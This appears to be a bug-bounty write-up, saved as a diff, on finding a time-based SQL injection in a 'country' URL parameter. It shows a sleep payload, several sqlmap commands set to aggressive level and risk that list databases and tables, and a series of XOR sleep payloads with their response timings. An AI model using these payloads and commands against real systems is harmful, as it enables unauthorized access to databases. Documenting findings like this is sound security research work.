@@ -1,0 +1,24 @@
+https://sapt.medium.com/sqli-on-a-bugcrowd-private-program-17858b57ec61
+So during recon I had already sorted the urls with params which might be vulnerable to SQL Injection(using gf). So I then started opening those one by one to see which ones were actually active and worth trying for, and side by side each time I was replacing the parameter value with the sleep payload ,(select * from (select(sleep(20)))a) , so basically I was trying to find Time Based SQLi because putting all of the urls in sqlmap is very much time consuming.
+
+Finally I came across one url https://edu.target.com//us/search/site.html?country=us&searchtype=mirror-country in which I was getting a delay when I injected my payload in “country” parameter. So I was pretty sure that this would be vulnerable😈, but I had to confirm so I captured my request and sent it to repeater. There I kept on changing the value of seconds from 30 to 40 to 60 and they were getting accurate delay, so now I finally found a url which I would be sending to sqlmap.
+
+Now in kali I wrote the following command:
+
+sqlmap -u ‘https://edu.target.com//us/search/site.html?country=us&searchtype=mirror-country' — random-agent — level=5 — risk=3 — dbs — batch
+sqlmap -u ‘https://edu.target.com//us/search/site.html?country=us&searchtype=mirror-country' — random-agent — level=5 — risk=3 -D ‘training’ — tables
+
+Got 91 tables in training database
+
+sqlmap -u ‘https://edu.target.com//us/search/site.html?country=us&searchtype=mirror-country' — random-agent — level=5 — risk=3 -D ‘information_schema’ — tables
+
+sqlmap  -p log -r request-cz.txt --current-user  --level=2 --risk=2
+    0"XOR(if(now()=sysdate(),sleep(12),0))XOR”Z => 12.508
+    0"XOR(if(now()=sysdate(),sleep(12),0))XOR”Z => 12.543
+    0"XOR(if(now()=sysdate(),sleep(0),0))XOR”Z => 0.523
+    0"XOR(if(now()=sysdate(),sleep(6),0))XOR”Z => 6.565
+    0"XOR(if(now()=sysdate(),sleep(3),0))XOR”Z => 3.518
+    0"XOR(if(now()=sysdate(),sleep(0),0))XOR”Z => 0.502
+    0"XOR(if(now()=sysdate(),sleep(12),0))XOR”Z => 12.491
+    0"XOR(if(now()=sysdate(),sleep(6),0))XOR”Z => 6.508
+    0"XOR(if(now()=sysdate(),sleep(0),0))XOR”Z => 0.695      
